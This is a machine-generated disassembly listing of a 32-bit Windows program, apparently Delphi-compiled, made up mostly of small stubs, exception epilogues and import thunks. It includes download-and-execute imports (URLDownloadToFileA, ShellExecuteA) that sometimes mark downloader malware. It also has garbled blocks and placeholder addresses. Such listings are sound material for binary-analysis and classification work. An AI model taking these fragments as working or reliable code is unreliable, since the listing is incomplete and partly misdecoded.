add [ esp + 0x4 ] 0xffffffd4
jmp sub_4070f4
sub_409754
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
pop ebx
retn
sub_409790
jmp [ rw-data ]
sub_409798
jmp [ rw-data ]
sub_40a39d
jmp sub_404de4
sub_40a3a4
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40a84c
push ebx
mov ebx eax
push 0x0
mov eax ebx
call sub_4059dc
push eax
call CreateDirectoryA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_40a898
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_40a8ac
push esi
mov esi eax
xchg edx eax
call sub_4030fc
mov eax esi
pop esi
retn
sub_40aabc
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_402f00
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_40aad0
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_40ab08
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_402f1c
sub_40ab70
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_403050
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_40ab94
push ebx
mov ebx eax
mov eax ebx
call sub_405530
pop ebx
retn
sub_40aef7
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_405530
pop eax
pop ebx
retn
sub_40b1cb
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_40b326
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40b683
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_40b683
sub_40b77c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4059dc
mov edx esi
xor ecx ecx
call sub_40b5cc
pop esi
pop ebx
retn
sub_40b7f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4059dc
mov edx esi
mov cl 0x1
call sub_40b5cc
pop esi
pop ebx
retn
sub_40c00e
jmp sub_404de4
sub_40c015
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c116
jmp sub_404de4
sub_40c11d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_404de4#9
jmp sub_404de4
sub_40c8cb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40cad2
jmp sub_404de4
sub_40cad9
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40cf86
jmp sub_404de4
sub_40cf8d
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40d4fb
jmp sub_404de4
sub_40d502
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40d5ad
jmp sub_404de4
sub_40d5b4
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40d657
jmp sub_404de4
sub_40d65e
pop esi
pop ecx
pop ebp
retn
sub_40d840
jmp sub_404de4
sub_40d847
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40d8a0
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40db92
jmp sub_404de4
sub_40dc60
jmp sub_404de4
sub_40dcd0
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_404604
sub_40ddca
pop ebx
retn
sub_40de68
jmp sub_404de4
sub_40de6f
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40de78
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_404ec4
sub_40de85
retn
sub_40de88
push ebp
mov ebp esp
call sub_40ddcc
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40de78
pop ebp
retn 0x4
sub_40dea4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
retn
sub_40df3c
push ebx
mov ebx eax
mov eax ebx
call sub_40debc
movzx eax al
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40e10f
jmp sub_404de4
sub_40e116
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e1d9
jmp sub_404de4
sub_40e1e0
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40e1e8
call sub_40da34
mov eax 0x1
call sub_405464
sub_40e384
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40e45d
jmp sub_404de4
sub_40e47a
jmp sub_404de4
sub_40e481
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40e528
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40e490
mov ecx eax
sub_40e750
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40e770
push eax
call CharNextA
retn
sub_40ee97
jmp sub_404de4
sub_40ee9e
pop ebx
mov esp ebp
pop ebp
retn
sub_40f08d
jmp sub_404de4
sub_40f094
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40f119
retn
sub_40f303
jmp sub_404de4
sub_40f30a
pop ebx
mov esp ebp
pop ebp
retn
sub_40f310
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40f26c
sub_40f364
mov edx [ eax ]
xor edx [ eax + 0x4 ]
xor edx [ eax + 0x8 ]
xor edx [ eax + 0xc ]
mov eax edx
retn
sub_40f374
mov edx [ eax ]
ror edx 0x5
xor edx [ eax + 0x4 ]
ror edx 0x5
xor edx [ eax + 0x8 ]
ror edx 0x5
xor edx [ eax + 0xc ]
mov eax edx
retn
sub_40f38c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
retn
sub_40f490
call sub_40f41c
cmp eax [ rw-data ]
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
call sub_40f38c
sub_40f514
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40f520
xchg [ eax ] edx
mov eax edx
retn
sub_40f588
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
movzx eax [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40f61c
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40f738
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40f760
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40f9ef
jmp sub_404de4
sub_40f9f6
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40fa64
jmp sub_404de4
sub_40fa6b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fa89
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40fa82
jmp sub_404de4
sub_40fa89
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
SHFileOperationA
jmp [ SHFileOperationA@IAT ]
SHGetFileInfoA
jmp [ SHGetFileInfoA@IAT ]
__imp_ShellExecuteA
jmp [ ShellExecuteA@IAT ]
ShellExecuteExA
jmp [ ShellExecuteExA@IAT ]
IsEqualGUID
jmp [ IsEqualGUID@IAT ]
StringFromCLSID
jmp [ StringFromCLSID@IAT ]
ProgIDFromCLSID
jmp [ ProgIDFromCLSID@IAT ]
CLSIDFromProgID
jmp [ CLSIDFromProgID@IAT ]
CoTaskMemFree
jmp [ CoTaskMemFree@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
GetErrorInfo
jmp [ GetErrorInfo@IAT ]
URLDownloadToFileA
jmp [ URLDownloadToFileA@IAT ]
VariantInit
jmp [ VariantInit@IAT ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_4100a4
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_41010a
jmp sub_404de4
sub_410111
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_410176
jmp sub_404de4
sub_41017d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_4101e2
jmp sub_404de4
sub_4101e9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_41024e
jmp sub_404de4
sub_410255
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_4102ba
jmp sub_404de4
sub_4102c1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_410339
jmp sub_404de4
sub_410340
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_4103ac
jmp sub_404de4
sub_4103b3
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_41041e
jmp sub_404de4
sub_410425
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_410494
jmp sub_404de4
sub_41049b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_410821
jmp sub_404de4
sub_410828
pop ebp
retn
sub_41082d
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_410e4e
jmp sub_404de4
sub_410e55
pop ecx
pop ebp
retn
sub_410ee7
jmp sub_404de4
sub_410eee
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410f3e
jmp sub_404de4
sub_410f45
pop ecx
pop ebp
retn
sub_410fd7
jmp sub_404de4
sub_410fde
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41102e
jmp sub_404de4
sub_411035
pop ecx
pop ebp
retn
sub_41127d
jmp sub_404de4
sub_411284
pop ebx
mov esp ebp
pop ebp
retn
sub_41139a
jmp sub_404de4
sub_4113a1
pop ecx
pop ebp
retn
sub_4113a4
push ebx
mov ebx eax
mov eax ebx
call sub_41163c
mov [ ebx ] 0x1
pop ebx
retn
sub_41163c
test [ eax ] 0xbfe8
jne r-xdata
call sub_4115c0
retn
mov [ eax ] 0x0
retn
sub_411650
push eax
call sub_41163c
pop eax
retn
sub_41174c
jmp sub_404de4
sub_4119b4
call sub_411a68
retn
sub_411b08
jmp sub_404de4
sub_411b0f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411b56
jmp sub_404de4
sub_411b5d
pop ebx
pop ecx
pop ebp
retn
sub_411ba2
jmp sub_404de4
sub_411ba9
pop ebx
pop ecx
pop ebp
retn
sub_411bee
jmp sub_404de4
sub_411bf5
pop ebx
pop ecx
pop ebp
retn
sub_411c3a
jmp sub_404de4
sub_411c41
pop ebx
pop ecx
pop ebp
retn
sub_412003
jmp sub_404de4
sub_41200a
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4120a4
jmp sub_404de4
sub_4120ab
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412519
jmp sub_404b30
sub_4125d6
jmp sub_404b30
sub_412681
jmp sub_404b30
sub_412779
jmp sub_404b30
sub_412852
jmp sub_404b30
sub_41293e
jmp sub_404b30
sub_412afe
jmp sub_404de4
sub_412b05
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412b67
jmp sub_404de4
sub_412b6e
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412fd4
jmp sub_404b30
sub_4130be
jmp sub_404de4
sub_4130c5
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_413164
jmp sub_404de4
sub_41316b
movzx eax [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4135c9
jmp sub_404de4
sub_4135d0
fld [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_413679
jmp sub_404de4
sub_413680
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_413bb1
jmp sub_404b30
sub_413cb8
jmp sub_404de4
sub_413cbf
fld [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_413dc9
jmp sub_404de4
sub_413dd0
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_414220
jmp sub_404de4
sub_414227
fild [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_414331
jmp sub_404de4
sub_414338
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41487c
jmp sub_404de4
sub_414883
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414929
jmp sub_404de4
sub_414930
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414952
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_405d40
retn
sub_41494b
jmp sub_404de4
sub_414952
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4149ae
jmp sub_404de4
sub_4149b5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414a31
jmp sub_404de4
sub_414f70
jmp sub_404de4
sub_414f77
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41500d
jmp sub_404de4
sub_415014
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415031
lea eax [ ebp - 0x14 ]
call sub_405d28
retn
sub_41502a
jmp sub_404de4
sub_415031
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41508e
jmp sub_404de4
sub_415095
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415137
jmp sub_404de4
sub_415154
jmp sub_404de4
sub_41515b
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4156a9
jmp sub_404de4
sub_4156b0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415722
jmp sub_404de4
sub_415729
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415ab4
push eax
call sub_41163c
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_415ac8
push eax
call sub_41163c
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_415b98
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_411a68
add esp 0x10
sub_415e42
jmp sub_404de4
sub_415e49
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415e8c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_41163c
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_415ea4
mov edx 0x80020004
call sub_415e8c
retn
sub_415f35
jmp sub_404de4
sub_415f3c
pop esi
pop ebx
pop ebp
retn
sub_415f40
push ebp
mov ebp esp
call sub_416100
pop ebp
retn 0x4
sub_415fcc
push ebp
mov ebp esp
call sub_416100
pop ebp
retn 0x4
sub_4160af
jmp sub_404de4
sub_4160b6
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_404640
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4049c4
sub_4160d8
xor eax eax
retn
sub_4160dc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4160f0
mov [ ecx ] 0x8
mov al 0x1
retn
sub_4160f8
call sub_410e04
retn
sub_416100
call sub_410ef4
retn
sub_416108
call sub_411350
retn
sub_416110
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_416124
call sub_416100
retn
sub_41612c
push ebp
mov ebp esp
call sub_416108
pop ebp
retn 0x8
sub_416144
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_416220
jmp sub_404de4
sub_4162ed
jmp sub_404de4
sub_4162f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416311
lea eax [ ebp - 0x10 ]
call sub_405530
retn
sub_41630a
jmp sub_404de4
sub_416311
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41631c
call sub_41163c
retn
sub_416324
call sub_4113a4
retn
sub_41639b
jmp sub_404de4
sub_4163a2
pop ebp
retn
sub_4164e8
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_416773
jmp sub_404de4
sub_41677a
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41680c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_405584
pop esi
pop ebx
retn
sub_4168a8
jmp sub_404de4
sub_4168af
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4169af
jmp sub_404de4
sub_4169b6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416bb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_411a68
pop esi
pop ebx
retn
sub_416d3a
jmp sub_404de4
sub_416d41
pop ebp
retn
sub_41757d
jmp eax
sub_417cb5
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
sub_417ef6
inc ecx
add al bh
retn
sub_417f5e
inc ecx
add [ eax ] bl

sub_417f62
inc ecx
add [ ebx + ecx * 8 + 0x41 ] dl
add [ edi + ecx * 8 ] ah
inc ecx
add [ eax - 0x34 ] dl
inc ecx
add [ eax - 0x11 ] dh
inc ecx
add [ esp + ecx * 8 + 0x41 ] dh
add ah bh
int3
sub_4180b7
add [ esp + 0x4 ] 0xffffffd8
jmp sub_4207b0
sub_4180c1
add [ esp + 0x4 ] 0xffffffd8
jmp sub_4207d0
sub_4180cb
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_4181f3
push ecx
push eax
jmp eax
sub_418438
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_41855c
mov eax [ eax + 0xc ]
call sub_419740
retn
sub_418830
jmp sub_404de4
sub_418837
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418b5b
jmp sub_404de4
sub_418b62
mov esp ebp
pop ebp
retn
sub_418c34
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_418c40
push ebx
mov ebx edx
mov edx ebx
call sub_418a50
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_418780
sub_418cec
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_418e47
jmp sub_404de4
sub_418f1b
jmp sub_404de4
sub_418f2c
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_418f98
jmp sub_404de4
sub_418f9f
pop ebx
mov esp ebp
pop ebp
retn
sub_418fea
jmp sub_404de4
sub_418ff1
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_41907d
jmp sub_404de4
sub_419084
pop ebx
pop ebp
retn
sub_4190ca
jmp sub_404de4
sub_4190d1
pop ebx
pop ebp
retn
sub_419116
jmp sub_404de4
sub_41911d
pop ebx
pop ebp
retn
sub_419167
jmp sub_404de4
sub_41916e
pop esi
pop ebx
pop ebp
retn
sub_4191c2
jmp sub_404de4
sub_4191c9
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4192f6
jmp sub_404de4
sub_4193cc
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_4199dc
sub_4194bc
jmp sub_404de4
sub_419646
jmp sub_404de4
sub_41964d
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4196e7
jmp sub_404de4
sub_4196ee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41970d
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_419706
jmp sub_404de4
sub_41970d
movzx eax [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_419774
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_419a38
xor edx edx
mov eax ebx
call sub_4199fc
pop ebx
retn
sub_4197e8
mov eax [ ebp + 0x4 ]
retn
sub_41981e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41986c
jmp sub_404de4
sub_419873
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419878
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_419890
xor edx edx
call sub_419898
retn
sub_419980
mov edx [ eax + 0x8 ]
dec edx
call sub_419898
retn
sub_419aac
retn
sub_419b67
jmp sub_404de4
sub_419b6e
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4049c4
sub_419bfc
jmp sub_404de4
sub_419c03
pop ebx
pop ecx
pop ebp
retn
sub_419c08
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_419c5f
jmp sub_404de4
sub_419c66
pop ebx
pop ecx
pop ebp
retn
sub_419c6c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_419ca8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
retn
sub_419cc0
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_419d9b
retn
sub_419e40
test edx edx
je r-xdata
xor edx edx
call sub_419e54
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_419f0a
jmp sub_404de4
sub_419f11
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419f24
xchg edx eax
call sub_419e54
retn
sub_419f2c
retn
sub_419fc5
jmp sub_404de4
sub_419fcc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a116
jmp sub_404de4
sub_41a226
jmp sub_404de4
sub_41a22d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a24a
lea eax [ ebp - 0xc ]
call sub_405530
retn
sub_41a243
jmp sub_404de4
sub_41a24a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a2f4
jmp sub_404de4
sub_41a30c
push ebx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
inc [ ebx + 0x10 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41a3c8
dec [ eax + 0x10 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41a471
jmp sub_404de4
sub_41a478
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a484
mov eax [ ebp + 0x4 ]
retn
sub_41a4ba
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41a508
jmp sub_404de4
sub_41a50f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a5ce
jmp sub_404de4
sub_41a5d5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a5fa
lea eax [ ebp - 0x10 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_41a5f3
jmp sub_404de4
sub_41a5fa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a604
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_41a60c
xor eax eax
retn
sub_41a655
jmp sub_404de4
sub_41a65c
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41a78d
jmp sub_404de4
sub_41a794
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a814
jmp sub_404de4
sub_41a81b
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a8eb
jmp sub_404de4
sub_41a8f2
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a9a8
jmp sub_404de4
sub_41a9af
pop ebx
pop ecx
pop ebp
retn
sub_41aa34
jmp sub_404de4
sub_41aa3b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aa58
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_41aa51
jmp sub_404de4
sub_41aa58
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41aae4
jmp sub_404de4
sub_41ab01
jmp sub_404de4
sub_41ab08
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ab40
retn
sub_41abc3
jmp sub_404de4
sub_41abca
mov eax [ ebp - 0x8 ]
call sub_41dcf8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41abef
lea eax [ ebp - 0xc ]
call sub_405530
retn
sub_41abe8
jmp sub_404de4
sub_41abef
mov esp ebp
pop ebp
retn
sub_41ac3f
jmp sub_404de4
sub_41ac46
pop ebx
pop ecx
pop ebp
retn
sub_41ac9d
jmp sub_404de4
sub_41aca4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41acac
retn
sub_41ad27
jmp sub_404de4
sub_41ad2e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ae8b
jmp sub_404de4
sub_41aebd
jmp sub_404de4
sub_41aec4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41af52
jmp sub_404de4
sub_41af59
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b004
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
movzx eax [ ebx + 0xd ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41b01c
sub_41b094
push ebx
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop esi
pop ebx
retn
sub_41b108
push ebx
cmp [ eax + 0x10 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41b124
push ebx
cmp [ eax + 0x10 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x32 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41b324
mov eax [ eax + 0x20 ]
retn
sub_41b328
mov eax [ eax + 0x1c ]
retn
sub_41b3c4
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41b610
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41b648
mov edx sub_41b628
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41b794
retn
sub_41ba8c
jmp sub_404de4
sub_41ba93
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41baf4
jmp sub_404de4
sub_41bafb
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bb40
mov eax [ eax + 0x4 ]
call sub_40a1c4
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41bb50
mov eax [ eax + 0x4 ]
call sub_40a1f0
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41bb8c
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41bd54
jmp sub_404de4
sub_41bdb4
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41be18
push ebx
mov ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx [ eax + 0x4 ]
xchg edx ebx
mov eax ebx
call sub_41b978
sub_41be7b
jmp sub_404de4
sub_41be82
pop ebx
pop ecx
pop ebp
retn
sub_41bf4c
jmp sub_404de4
sub_41bf53
pop ebx
pop ecx
pop ebp
retn
sub_41c2c6
jmp sub_404de4
